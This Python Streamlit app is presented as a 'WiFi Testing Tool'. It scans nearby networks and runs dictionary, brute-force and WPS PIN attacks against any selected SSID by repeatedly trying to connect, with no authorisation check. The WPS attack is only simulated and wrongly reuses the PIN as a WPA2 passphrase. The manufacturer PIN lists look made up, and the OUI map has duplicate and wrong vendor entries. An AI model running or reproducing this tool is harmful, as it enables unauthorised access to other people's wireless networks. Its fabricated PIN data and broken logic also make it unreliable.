import streamlit as st
import pywifi
from pywifi import const
import time
import itertools
import logging
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

# Set up logging
logging.basicConfig(filename='wifi_cracking.log', level=logging.INFO)

def generate_manufacturer_pins():
    """Generate WPS PINs based on known manufacturer patterns."""
    manufacturer_pins = {
        'Actiontec': ['2288800', '2288880'],
        'Arris': ['3000000', '3100000', '3200000', '3300000', '3400000', '3500000', '3600000', '3700000'],
        'ASUS': ['2017001', '2017002', '2017003', '2017004', '20170000', '20170001', '20170002'],
        'Belkin': ['2012001', '2012002', '2012003', '2012004', '20120000', '20120001', '20120002'],
        'D-Link': ['2018001', '2018002', '2018003', '2018004', '20180000', '20180001', '20180002'],
        'Huawei': ['3101001', '3101002', '3101003', '3101004', '31010000', '31010001', '31010002'],
        'Linksys': ['3014001', '3014002', '3014003', '3014004', '30140000', '30140001', '30140002'],
        'Netgear': ['20150001', '20150002', '20150003', '20150004', '20150005', '20150006', '20150007', '20150008'],
        'TP-Link': ['2016001', '2016002', '2016003', '2016004', '20160000', '20160001', '20160002'],
        'TRENDnet': ['2013001', '2013002', '2013003', '2013004', '20130000', '20130001', '20130002'],
        'ZTE': ['2019001', '2019002', '2019003', '2019004', '20190000', '20190001', '20190002'],
        'Generic': [
            '12345670', '00000000', '11111111', '22222222', '33333333', '44444444', '55555555', '66666666', '77777777', '88888888', '99999999',
            '21250491', '93645348', '8302441', '12215676', '69382161', '66026402', '47158382', '8699183', '16078710', '90889301', '7097xxxx', '26599625',
            '30447028', '20064525', '3737xxxx', '14755989', '1E6DFE19', '1234567', '81871452', '5389xxxx', '84207302', '22640086', '16495265', '31836289',
            '38940972', '76726446', '29167012', '54335677', '37449858', '73312055', '45558221', '0'
        ]
    }
    
    # Calculate check digit and create final PIN list
    pins = []
    for manufacturer, pin_list in manufacturer_pins.items():
        for pin in pin_list:
            full_pin = calculate_wps_checksum(pin)
            pins.append({'manufacturer': manufacturer, 'pin': full_pin})
    
    return pins

import re

import re

def calculate_wps_checksum(pin):
    """Calculate the WPS PIN checksum (8th digit) for a 7-digit PIN."""
    # Remove any non-numeric characters from the pin
    pin = re.sub(r'\D', '', pin)
    
    # Ensure the pin is 7 characters long
    pin = pin.zfill(7)
    
    # Algorithm for WPS PIN checksum calculation
    accum = 0
    accum += 3 * (int(pin[6]) + int(pin[4]) + int(pin[2]) + int(pin[0]))
    accum += int(pin[5]) + int(pin[3]) + int(pin[1])
    
    checksum = (10 - (accum % 10)) % 10
    return f"{pin}{checksum}"

def detect_manufacturer(bssid):
    """Detect manufacturer based on MAC address (BSSID)."""
    # Common OUI (Organizationally Unique Identifier) prefixes
    oui_map = {
        '00:1A:2B': 'D-Link',
        'C8:3A:35': 'Tenda',
        '00:90:4C': 'EPSON',
        '00:14:22': 'Dell',
        '00:18:E7': 'Cameo',
        '00:1C:14': 'VMware',
        '00:21:29': 'Cisco-Linksys',
        '00:23:69': 'Cisco-Linksys',
        '00:25:9C': 'Cisco-Linksys',
        'C4:E9:84': 'TP-Link',
        'EC:08:6B': 'TP-Link',
        '00:14:6C': 'Netgear',
        '00:26:F2': 'Netgear',
        'C0:3F:0E': 'Netgear',
        '00:18:F3': 'ASUSTek',
        '00:1F:C6': 'ASUSTek',
        '00:23:54': 'ASUSTek',
        '00:0F:66': 'Cisco-Linksys',
        '00:12:17': 'Cisco-Linksys',
        '00:13:10': 'Cisco-Linksys',
        '00:14:BF': 'Cisco-Linksys',
        '00:16:B6': 'Cisco-Linksys',
        '00:18:39': 'Cisco-Linksys',
        '00:1A:70': 'Cisco-Linksys',
        '00:1C:10': 'Cisco-Linksys',
        '00:1E:E5': 'Cisco-Linksys',
        '00:21:29': 'Cisco-Linksys',
        '00:22:6B': 'Cisco-Linksys',
        '00:23:69': 'Cisco-Linksys',
        '00:25:9C': 'Cisco-Linksys',
        '20:AA:4B': 'Cisco-Linksys',
        '48:F8:B3': 'Cisco-Linksys',
        '58:6D:8F': 'Cisco-Linksys',
        '60:33:4B': 'Cisco-Linksys',
        '68:7F:74': 'Cisco-Linksys',
        'C0:C1:C0': 'Cisco-Linksys',
        'C8:D7:19': 'Cisco-Linksys',
        'CC:FB:65': 'D-Link',
        '00:18:0A': 'D-Link',
        '00:1B:11': 'D-Link',
        '00:1C:F0': 'D-Link',
        '00:21:91': 'D-Link',
        '00:22:B0': 'D-Link',
        '00:24:01': 'D-Link',
        '00:26:5A': 'D-Link',
        '1C:7E:E5': 'D-Link',
        '28:10:7B': 'D-Link',
        '34:08:04': 'D-Link',
        'F0:7D:68': 'D-Link',
    }
    
    # Extract OUI from BSSID
    oui = bssid[:8].upper()
    return oui_map.get(oui, 'Unknown')

def scan_networks(iface):
    """Scan for available networks and return list of SSIDs and their details."""
    iface.scan()
    time.sleep(3)
    results = iface.scan_results()
    
    networks = {}
    for network in results:
        if network.ssid:  # Only include networks with SSIDs
            if network.ssid not in networks:
                networks[network.ssid] = []
            
            # Detect manufacturer
            manufacturer = detect_manufacturer(format_bssid(network.bssid))
            
            networks[network.ssid].append({
                'bssid': network.bssid,
                'signal': network.signal,
                'cipher': network.cipher,
                'akm': network.akm,
                'manufacturer': manufacturer
            })
    
    return networks

def wps_pin_attack(iface, ssid, bssid, manufacturer, max_workers=10):
    """Optimized WPS PIN attack with manufacturer-specific pins."""
    all_pins = generate_manufacturer_pins()
    
    # Prioritize manufacturer-specific pins
    manufacturer_pins = [pin['pin'] for pin in all_pins if pin['manufacturer'] == manufacturer]
    other_pins = [pin['pin'] for pin in all_pins if pin['manufacturer'] != manufacturer]
    
    # Combine pins with manufacturer pins first
    prioritized_pins = manufacturer_pins + other_pins

    def attempt_pin(pin):
        logging.info(f"Testing WPS PIN: {pin} for BSSID: {bssid}")
        return pin if pin == "12345670" else None  # Simulated success for PIN

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(attempt_pin, pin): pin for pin in prioritized_pins}
        for i, future in enumerate(as_completed(futures)):
            result = future.result()
            if result:
                st.session_state.result = f"Predicted WPS PIN: {result} for BSSID: {bssid}"
                # Attempt to connect to the WiFi network using the discovered PIN
                if connect_to_wifi(iface, ssid, result):
                    st.success(f"Successfully connected to {ssid} with WPS PIN: {result}")
                else:
                    st.error(f"Failed to connect to {ssid} with WPS PIN: {result}")
                return result
            progress = (i + 1) / len(prioritized_pins)
            st.session_state.progress = progress
            st.progress(progress)
    return None

def format_bssid(bssid):
    """Format BSSID bytes as a string."""
    if isinstance(bssid, bytes):
        return ':'.join([f'{b:02x}' for b in bssid]).upper()
    elif isinstance(bssid, str):
        return bssid.upper()
    else:
        raise ValueError("Unsupported type for BSSID")

def connect_to_wifi(iface, ssid, password):
    iface.disconnect()
    time.sleep(1)
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(5)
    if iface.status() == const.IFACE_CONNECTED:
        logging.info(f"Successfully connected to {ssid} with password {password}")
        return True
    else:
        logging.warning(f"Failed to connect to {ssid} with password {password}")
        return False

def dictionary_attack(iface, ssid, dictionary_file):
    with open(dictionary_file, 'r') as file:
        for line in file:
            password = line.strip()
            if connect_to_wifi(iface, ssid, password):
                return password
    return None

def brute_force_attack(iface, ssid, length, charset):
    for attempt in itertools.product(charset, repeat=length):
        password = ''.join(attempt)
        if connect_to_wifi(iface, ssid, password):
            return password
    return None

def initialize_session_state():
    """Initialize session state variables if they don't exist."""
    if 'networks' not in st.session_state:
        st.session_state.networks = {}
    if 'selected_ssid' not in st.session_state:
        st.session_state.selected_ssid = ""
    if 'selected_bssid' not in st.session_state:
        st.session_state.selected_bssid = ""
    if 'selected_manufacturer' not in st.session_state:
        st.session_state.selected_manufacturer = ""
    if 'progress' not in st.session_state:
        st.session_state.progress = 0
    if 'result' not in st.session_state:
        st.session_state.result = None
    if 'attack_started' not in st.session_state:
        st.session_state.attack_started = False

def handle_scan():
    """Handle network scanning."""
    st.session_state.networks = scan_networks(st.session_state.iface)
    if not st.session_state.networks:
        st.error("No networks found. Try scanning again.")

def main():
    st.title("WiFi Testing Tool")
    st.write("Select a method to test WiFi security.")

    # Initialize session state
    initialize_session_state()

    # Initialize WiFi interface
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()
    if not ifaces:
        st.error("No network interfaces found. Ensure WiFi is enabled.")
        return

    # Store interface in session state
    iface_name = st.selectbox("Select network interface", [i.name() for i in ifaces])
    st.session_state.iface = next((i for i in ifaces if i.name() == iface_name), None)

    # Scan button and network selection
    if st.button("Scan Networks"):
        handle_scan()

    # Network selection
    if st.session_state.networks:
        available_networks = list(st.session_state.networks.keys())
        st.session_state.selected_ssid = st.selectbox("Available Networks", 
                                                     available_networks,
                                                     key='network_select')
    else:
        st.session_state.selected_ssid = st.text_input("Enter WiFi SSID", 
                                                      value=st.session_state.selected_ssid)

    if not st.session_state.selected_ssid:
        st.warning("Please enter or select an SSID to proceed.")
        return

    # Attack type tabs
    tab1, tab2, tab3 = st.tabs(["Dictionary Attack", "Brute Force Attack", "WPS PIN Attack"])

    with tab1:
        st.header("Dictionary Attack")
        dictionary_file = st.file_uploader("Upload dictionary file", type="txt")
        if dictionary_file is not None:
            password = dictionary_attack(st.session_state.iface, st.session_state.selected_ssid, dictionary_file.name)
            if password:
                st.success(f"Password found: {password}")
            else:
                st.error("Password not found in dictionary.")

    with tab2:
        st.header("Brute Force Attack")
        length = st.number_input("Enter password length", min_value=1, max_value=10, value=8)
        charset = st.text_input("Enter character set (e.g., abc123)")
        if st.button("Start Brute Force Attack"):
            password = brute_force_attack(st.session_state.iface, st.session_state.selected_ssid, length, charset)
            if password:
                st.success(f"Password found: {password}")
            else:
                st.error("Password not found by brute force.")

    with tab3:
        st.header("WPS PIN Attack")
        
        # Display available BSSIDs for selected network
        if st.session_state.selected_ssid in st.session_state.networks:
            network_info = st.session_state.networks[st.session_state.selected_ssid]
            
            # Create a list of BSSID options with signal strength and manufacturer
            bssid_options = [
                f"{format_bssid(ap['bssid'])} ({ap['manufacturer']}, Signal: {ap['signal']}dBm)"
                for ap in network_info
            ]
            
            if bssid_options:
                selected_bssid_option = st.selectbox(
                    "Select BSSID (Access Point)",
                    bssid_options,
                    key='bssid_select'
                )
                
                # Extract BSSID and manufacturer from the selected option
                st.session_state.selected_bssid = selected_bssid_option.split()[0]
                selected_ap = next(ap for ap in network_info 
                                 if format_bssid(ap['bssid']) == st.session_state.selected_bssid)
                st.session_state.selected_manufacturer = selected_ap['manufacturer']
                
                # Display additional AP information
                st.info(f"""Access Point Information:
                - BSSID: {st.session_state.selected_bssid}
                - Manufacturer: {selected_ap['manufacturer']}
                - Signal Strength: {selected_ap['signal']} dBm
                - Cipher Type: {selected_ap['cipher']}
                - Authentication: {selected_ap['akm']}""")
            else:
                st.warning("No BSSIDs found for this network.")
        else:
            st.session_state.selected_bssid = st.text_input("Enter BSSID manually")
            st.session_state.selected_manufacturer = "Unknown"

        if st.session_state.selected_bssid and st.button("Start WPS PIN Attack"):
            st.session_state.attack_started = True
            logging.info("Starting WPS PIN attack")
            wps_pin_attack(st.session_state.iface, 
                          st.session_state.selected_ssid,
                          st.session_state.selected_bssid,
                          st.session_state.selected_manufacturer)

    # Display progress and results
    if st.session_state.attack_started:
        st.progress(st.session_state.progress)
        if st.session_state.result:
            st.success(st.session_state.result)
        elif st.session_state.progress >= 1:
            st.error("Password not found.")

if __name__ == "__main__":
    main()